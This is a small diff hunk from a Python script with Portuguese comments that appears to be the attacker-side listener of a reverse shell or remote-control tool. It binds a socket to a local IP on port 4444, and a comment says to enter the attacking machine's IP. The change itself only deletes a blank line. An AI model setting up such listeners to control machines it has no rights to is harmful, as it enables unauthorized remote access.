@@ -83,7 +83,6 @@ def t_commun():
             answer = data_recv()
             print(answer)
 
-
 #Conectar ao IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('192.168.15.59', 4444)) #Coloque o IP da máquina atacante aqui
